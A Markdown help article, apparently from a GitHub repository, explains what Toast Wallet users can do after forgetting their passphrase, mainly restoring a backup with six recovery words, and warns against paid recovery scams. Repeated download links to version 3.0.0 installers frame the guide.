<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet forgot passphrase</h1>

<p align="center">Options when you no longer remember the passphrase.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

If you forgot your Toast Wallet passphrase, restore your backup code using the six recovery words instead, inside the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). Then set a new passphrase and make a fresh backup. Nobody can reset the passphrase for you.

## 👀 You'll see this if

- Toast Wallet asks for your passphrase to send XRP and you cannot remember it.
- You remember the PIN but not the passphrase.
- You are trying to restore a backup and the passphrase you remember is refused.
- Someone online offers to "recover" your passphrase for a fee.

## 🤔 Why it matters

The passphrase protects the actions that matter most: sending XRP and restoring your wallet. Because Toast Wallet is self-custody, there is no company server holding a copy. That keeps you safe from hackers who target companies, but it means a forgotten passphrase cannot be reset by email or by a support desk.

Toast Wallet gives you a second route: the six recovery words. They can unlock your backup code in place of the passphrase. If you kept your backup code and the six words, a forgotten passphrase becomes a short inconvenience rather than a loss.

## 🧭 Before you start

Write down every passphrase you might have used, including older ones and slight variations, and gather your backup codes and the six recovery words if you have them. Sit somewhere private and allow yourself time; hurried attempts lead to typing mistakes that look like a wrong passphrase.

## 🛠️ Fix: get back in without the passphrase

1. **Try the obvious first.** Check that Caps Lock is off and that your keyboard layout is the usual one. Try the passphrase you used when the wallet was set up, not only the most recent one. More checks are in [Toast Wallet passphrase not working](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-passphrase-not-working.md).
2. **Find your backup code and six words.** You need both for this route.
3. **Back up what you can.** If the wallet still opens with your PIN, note your account addresses beginning with `r`.
4. **Install the latest desktop wallet.** Remove any old version and install the current release after checking the checksum.
5. **Restore with the six words.** Choose Restore an Existing Wallet, then Restore Backup. Paste the backup code. When asked, use the six recovery words instead of the passphrase. The full process is in [restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md).
6. **Choose a new passphrase.** Use a long phrase you can remember and write it down on paper.
7. **Make a new backup.** In Settings, choose Backup Wallet and store the new code with the new passphrase.

## 🔁 If that did not work

- **You have the passphrase but forgot the PIN.** That is a different problem with a simpler fix; see [reset your Toast Wallet PIN](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-reset-pin.md).
- **You have no six words.** Try every passphrase you might have used at the time of the backup. Older backups open with older passphrases.
- **You have neither the passphrase nor the six words.** Without one of them, the encrypted backup cannot be opened. If the wallet still unlocks with your PIN on some computer, keep that computer safe and look for any option to view account keys that does not require the passphrase.
- **Someone offers a paid recovery service.** That is a scam. Read [Toast Wallet fake support warning](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-fake-support-warning.md).

## 🛡️ Prevention

Write your passphrase on paper and store it with your backup code or in a separate safe place you will remember. Each time you change the passphrase, make a new backup and label it. Avoid passphrases built on keyboard tricks or special characters that are hard to type on another computer.

## 📝 Good to know

Passphrase memory often improves with context. Think about when you set up the wallet: which computer, which year, which password style you used at the time. Many people find their passphrase was a phrase they used elsewhere back then, or followed a pattern they have since abandoned. Write down each candidate before trying it, so you do not repeat attempts, and keep the list as private as the passphrase itself.

## 🔍 A closer look at why nobody can reset it

With an online banking app, a forgotten password is reset by the bank because the bank holds your account. Toast Wallet has no such account. The passphrase is part of the encryption that protects your keys on your own computer and inside your backup code. If a company could reset it, that company could also open your wallet, and so could anyone who broke into that company.

This design is what makes self-custody safe, but it changes how you should store the passphrase. Treat it like the key to a safe deposit box: written down, stored privately and kept with the means to restore. The six recovery words exist precisely to give you a second route when memory fails.

If you are reading this because you have already lost access, focus on what you still have. A backup code plus the six words is a complete recovery. An old computer where the wallet still unlocks with the PIN is another chance to make a new backup. Write down everything you can find before trying anything, so you do not lose track of which pieces you have tested.

## ❓ FAQ

<details>
<summary>Can Toast Wallet reset my passphrase?</summary>

No. There is no central account. The six recovery words are the built-in alternative.

</details>

<details>
<summary>Is the passphrase the same as the PIN?</summary>

No. The PIN unlocks the app; the passphrase protects sending and restoring.

</details>

<details>
<summary>Are passphrase recovery tools safe?</summary>

No online tool can recover a Toast passphrase. Sites claiming to do so are scams.

</details>

> [!WARNING]
> Never send your backup code or recovery words to anyone offering passphrase recovery. That is how wallets get emptied.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet passphrase not working](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-passphrase-not-working.md) | Common typing and backup-age reasons a passphrase is refused. |
| [Reset your Toast Wallet PIN](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-reset-pin.md) | Use Reset PIN with your passphrase, then choose a new PIN. |
| [Restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md) | Bring your accounts back with the backup code and passphrase or words. |
| [Toast Wallet fake support warning](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-fake-support-warning.md) | How fake helpers approach you and what real help looks like. |
